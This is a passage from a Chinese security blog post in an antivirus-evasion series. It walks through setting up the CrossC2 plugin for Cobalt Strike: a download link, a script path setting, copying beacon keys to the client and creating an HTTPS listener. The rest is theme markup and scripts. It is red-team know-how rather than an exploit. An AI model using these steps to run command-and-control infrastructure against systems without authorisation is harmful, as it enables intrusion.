+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gloxec/</span>CrossC2/releases<br></code></pre></td></tr></table></figure>
+
+<p>推荐放到 script目录下</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">menubar(<span class="hljs-string">&quot;CrossC2&quot;</span>, <span class="hljs-string">&quot;generator&quot;</span>, <span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$CC2_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>CS_linux<span class="hljs-subst">\\</span>coablt_strike_4.5_jx<span class="hljs-subst">\\</span>scripts<span class="hljs-subst">\\</span>&quot;</span>; # <span class="hljs-operator">&lt;--------</span> fix    <span class="hljs-comment">//注意：需要CrossC2的路径（不能有中文，且最后一行需要加上\\）</span><br><span class="hljs-variable">$CC2_BIN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;genCrossC2.exe&quot;</span>;  <span class="hljs-comment">//使用windows的客户端的版本文件名</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/Snipaste_2025-06-07_15-10-31.png" srcset="/img/loading.gif" lazyload></p>
+<p>菜单栏就会多出一个：<br><img src="/./img/Snipaste_2025-06-07_15-11-40.png" srcset="/img/loading.gif" lazyload></p>
+<p>2.复制linux服务端的 .cobaltstrike.beacon_keys 文件放到 cobaltstrike.jar 目录（windows 客户机）下, 覆盖原来的cobaltstrike.beacon_keys</p>
+<p><img src="/./img/Snipaste_2025-06-07_15-16-32.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用cs进行创建监听器，注意需要使用https协议</p>
+<p>第一步：</p>
+<p><img src="/./img/Snipaste_2025-06-07_15-19-56.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./img/Snipaste_2025-06-07_15-22-45.png" srcset="/img/loading.gif" lazyload></p>
+<p>完成：(注意不要使用 openjdk 我之前用的就生成不了，服务器端也必须要加上profile文件)</p>
+<p><img src="/./img/Snipaste_2025-06-07_16-05-34.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./img/Snipaste_2025-06-07_16-35-11.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97/" class="category-chain-item">免杀系列</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/" class="print-no-link">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>免杀之CS基础</div>
+      <div>http://example.com/2025/06/06/免杀之CS基础/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XCDH</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/06/07/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="Java代码审计之文件上传">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java代码审计之文件上传</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/06/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/" title="Java代码审计之SQL注入">
+                        <span class="hidden-mobile">Java代码审计之SQL注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>XCDH</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
